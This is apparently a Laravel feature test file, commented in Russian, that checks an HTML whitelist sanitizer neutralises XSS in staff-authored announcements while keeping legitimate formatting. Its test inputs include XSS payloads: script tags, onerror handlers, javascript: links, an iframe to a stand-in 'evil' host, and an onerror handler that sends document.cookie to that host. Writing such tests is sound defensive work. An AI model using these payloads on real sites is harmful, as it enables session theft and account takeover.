<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\Announcement;
use App\Models\User;
use App\Support\SanitizedHtml;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * H3309 — staff-authored rich text проходит whitelist-санитайзер на рендере:
 * payload из скомпрометированного staff-аккаунта не даёт XSS на публичных
 * страницах, а легитимное форматирование переживает санитизацию.
 */
class XssRenderSanitizerTest extends TestCase
{
    use RefreshDatabase;

    public function test_script_and_handlers_are_stripped(): void
    {
        $out = SanitizedHtml::render('<p>ok</p><script>alert(1)</script><img src=x onerror=alert(1)><iframe src=//evil></iframe>');

        $this->assertStringNotContainsString('script', $out);
        $this->assertStringNotContainsString('onerror', $out);
        $this->assertStringNotContainsString('iframe', $out);
        $this->assertStringContainsString('<p>ok</p>', $out);
    }

    public function test_javascript_urls_are_neutralized(): void
    {
        $out = SanitizedHtml::render('<a href="javascript:alert(1)">x</a><a href="https://good.example">y</a><a href="/relative">z</a>');

        $this->assertStringNotContainsString('javascript:', $out);
        $this->assertStringContainsString('href="https://good.example"', $out);
        $this->assertStringContainsString('href="/relative"', $out);
    }

    public function test_blank_target_gets_noopener(): void
    {
        $out = SanitizedHtml::render('<a href="https://ext.example" target="_blank">ext</a>');

        $this->assertStringContainsString('rel="noopener noreferrer"', $out);
    }

    public function test_legitimate_formatting_survives(): void
    {
        $html = '<h2>Заголовок</h2><p>Абзац с <strong>жирным</strong>, <em>курсивом</em> и «кавычками»</p><ul><li>пункт</li></ul><table><tr><td colspan="2">cell</td></tr></table>';
        $out = SanitizedHtml::render($html);

        foreach (['<h2>', '<strong>жирным</strong>', '<em>курсивом</em>', '<ul><li>пункт</li></ul>', 'colspan="2"'] as $needle) {
            $this->assertStringContainsString($needle, $out);
        }
    }

    public function test_unknown_tags_unwrap_keeping_children_text(): void
    {
        $out = SanitizedHtml::render('<section><p>inside</p></section>');

        $this->assertStringContainsString('<p>inside</p>', $out);
        $this->assertStringNotContainsString('<section', $out);
    }

    public function test_announcement_page_renders_payload_inert(): void
    {
        Announcement::query()->create([
            'title' => 'Payload',
            'preview' => 'Payload preview',
            'content' => '<img src=x onerror="fetch(\'//evil/\'+document.cookie)"><script>alert(1)</script><b>жирный текст</b>',
            'is_published' => true,
        ]);

        $student = User::factory()->create();

        $response = $this->actingAs($student)->get(route('student.messages'));

        $response->assertOk();
        $body = $response->getContent() ?? '';
        $this->assertStringNotContainsString('onerror', $body);
        $this->assertStringNotContainsString('<script>alert(1)</script>', $body);
        // DOMDocument отдаёт не-ASCII числовыми entity (браузер рендерит 1-в-1),
        // поэтому сравниваем после обратного декодирования.
        $decoded = html_entity_decode($body, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $this->assertStringContainsString('жирный текст', $decoded);
        $this->assertStringNotContainsString('alert(', $decoded);
    }
}
